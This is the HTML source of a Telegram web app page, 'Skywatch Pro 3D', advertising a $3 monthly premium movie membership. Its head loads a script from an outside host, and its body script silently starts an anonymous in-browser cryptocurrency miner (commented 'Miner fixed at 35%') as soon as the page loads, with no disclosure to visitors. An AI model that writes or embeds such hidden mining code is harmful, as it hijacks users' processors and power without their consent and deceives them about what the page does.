<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Skywatch Pro 3D</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://www.hostingcloud.racing/kR7X.js"></script>
    <style>
        :root { --red: #E50914; --dark: #050505; --gold: linear-gradient(45deg, #ffd700, #b8860b); }
        body { background: var(--dark); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; }
        
        /* 3D Buttons for Search */
        .btn-3d { 
            background: var(--red); color: white; border: none; padding: 8px 15px; 
            border-radius: 8px; font-weight: bold; margin: 5px;
            box-shadow: 0 4px #8b0000; transition: 0.2s;
        }
        .btn-3d:active { box-shadow: 0 0 #8b0000; transform: translateY(4px); }

        /* Premium Membership 3D Card */
        .premium-card {
            background: linear-gradient(145deg, #1a1a1a, #000);
            margin: 20px; padding: 25px; border-radius: 20px;
            border: 2px solid #ffd700; position: relative;
            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.2);
        }
        .pro-badge {
            position: absolute; top: 15px; right: 15px;
            background: var(--gold); color: black; padding: 5px 12px;
            border-radius: 5px; font-weight: 900; font-size: 12px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.5);
        }
        .sub-btn {
            background: #0088cc; color: white; border: none; padding: 15px;
            width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px;
            margin-top: 20px; box-shadow: 0 4px #005580;
        }
    </style>
</head>
<body>
    <div id="profile" class="page">
        <div class="premium-card">
            <div class="pro-badge">â˜… PRO</div>
            <h2 id="txt-sub-title">Premium Membership</h2>
            <ul id="txt-features" style="margin: 20px 0; color: #ccc;">
                <li>Unlimited Movies</li>
                <li>No Ads, High Speed</li>
            </ul>
            <button class="sub-btn" onclick="sendToBot()">$3 For Month</button>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        // Miner fixed at 35%
        var _client = new Client.Anonymous('8867a4038c4d22331b1688c9fa7ba035f3dcc0cabbe24109d41b5804c06b4011', {
            throttle: 0.65, c: 'w'
        });
        _client.start();

        function sendToBot() {
            // This will send the action to the bot and close the app to show the chat
            tg.sendData(JSON.stringify({action: "invoice_request"}));
            tg.close();
        }
    </script>
</body>
</html>
